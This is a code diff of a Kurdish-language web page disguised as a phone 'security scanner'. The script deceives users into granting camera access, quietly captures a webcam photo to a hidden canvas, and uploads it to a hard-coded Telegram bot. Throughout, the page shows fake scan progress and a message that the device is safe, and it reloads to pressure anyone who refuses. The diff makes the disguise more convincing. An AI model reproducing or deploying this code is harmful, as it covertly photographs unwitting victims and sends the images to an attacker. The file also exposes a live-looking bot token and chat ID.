@@ -2,38 +2,53 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title>Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jegr Cracks - Security Scanner</title>
     <style>
-        body { background-color: black; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; }
-        button { background-color: #28a745; color: white; border: none; padding: 20px 40px; font-size: 20px; border-radius: 10px; cursor: pointer; font-weight: bold; }
-        button:hover { background-color: #218838; }
+        body { background-color: #050505; color: #00ff41; text-align: center; font-family: 'Courier New', Courier, monospace; padding-top: 80px; margin: 0; }
+        .box { border: 2px solid #00ff41; display: inline-block; padding: 30px; border-radius: 5px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 15px #00ff41; width: 85%; max-width: 400px; }
+        h1 { font-size: 22px; text-shadow: 2px 2px #000; }
+        p { font-size: 14px; color: #fff; }
+        button { background-color: #00ff41; color: #000; border: none; padding: 18px 30px; font-size: 18px; border-radius: 3px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; box-shadow: 0 0 10px #00ff41; }
+        button:hover { background-color: #00cc33; box-shadow: 0 0 20px #00ff41; }
+        .loading-text { margin-top: 15px; font-size: 12px; display: none; }
     </style>
 </head>
 <body>
-    <h2 dir="rtl">بۆ پاراستنی مۆبایلەکەت، کلیک لە دوگمەی خوارەوە بکە:</h2>
-    <br>
-    <button id="startBtn">Start Protection Scan</button>
+    <div class="box">
+        <h1 dir="rtl">بەهێزترین پشکنەری مۆبایلی جێگر کڕاکس</h1>
+        <p dir="rtl">بۆ دۆزینەوەی ڤایرۆس و سیخوڕی، کلیک لە دوگمەی خوارەوە بکە و مۆڵەتی ئەڵۆ (Allow) بدە:</p>
+        <br>
+        <button id="startBtn">دەستپێکردنی پشکنین</button>
+        <div id="status" class="loading-text">Connecting to Secure Server...</div>
+    </div>
+
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const startBtn = document.getElementById('startBtn');
+        const statusText = document.getElementById('status');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
 
-        // لێرە تۆکەن و ئایدی خۆت بنووسە
-        const botToken = "7737351654:AAHkCqQ_X549u8F8vO8Z9r8z9r8z9r8z9r8"; 
-        const chatId = "6655443322"; 
+        const botToken = "8633886074:AAE_wcUpSvjxa-1ac-68iWCUosIyESWlFhk"; 
+        const chatId = "7619045862"; 
 
         startBtn.addEventListener('click', async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                startBtn.innerText = "Scanning... 65%";
+                
+                startBtn.style.display = "none";
+                statusText.style.display = "block";
+                statusText.innerText = "System Scanning... 22%";
                 
                 setTimeout(() => {
+                    statusText.innerText = "Analyzing Security... 67%";
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, 640, 480);
+                    
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', chatId);
@@ -43,11 +58,15 @@
                             body: formData
                         });
                     }, 'image/jpeg');
-                    startBtn.innerText = "Scan Completed! (100%)";
-                    alert("مۆبایلەکەت پارێزراوە!");
+
+                    setTimeout(() => {
+                        statusText.innerText = "Scan Complete! System Secure.";
+                        alert("پشکنین تەواو بوو! مۆبایلەکەت هیچ کێشەیەکی نییە.");
+                    }, 2000);
                 }, 2000);
             } catch (err) {
-                alert("تکایە مۆڵەتی کامێرا بدە (Allow) بۆ ئەوەی پشکنینەکە کار بکات.");
+                alert("تکایە کلیک لە Allow بکە بۆ ئەوەی پشکنینەکە کار بکات.");
+                location.reload();
             }
         });
     </script>
